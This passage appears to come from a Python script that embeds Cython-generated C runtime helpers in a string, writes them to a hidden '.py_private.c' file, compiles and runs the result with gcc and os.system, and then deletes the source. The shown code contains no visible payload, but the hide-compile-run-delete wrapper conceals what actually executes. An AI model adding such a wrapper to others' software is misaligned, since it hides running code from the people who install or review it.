                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
